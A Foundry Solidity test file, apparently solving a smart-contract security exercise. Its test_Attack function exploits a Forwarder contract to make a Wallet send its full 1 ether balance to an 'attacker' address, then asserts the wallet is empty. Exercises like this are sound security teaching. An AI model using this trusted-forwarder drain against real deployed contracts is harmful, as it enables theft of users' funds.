// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {Forwarder, Wallet} from "../src/Forwarder.sol";

contract ForwarderTest is Test {
    Forwarder public forwarder;
    Wallet public wallet;

    function setUp() public {
        forwarder = new Forwarder();
        wallet = new Wallet{value: 1 ether}(address(forwarder));
    }

    /// @dev to forward a call of a function in another contract,
    /// we need to know the function signature and the arguments
    /// we can use `abi.encodeWithSignature` to encode the function call
    /// and pass it to `functionCall` in the forwarder contract
    function test_Attack() public {
        address destination = address(0x1);
        uint256 amount = 1 ether;
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", destination, amount);
        forwarder.functionCall(address(wallet), data);
        require(address(wallet).balance == 0, "wallet should be empty");
        require(destination.balance == 1 ether, "attacker should have 1 ether");
    }
}
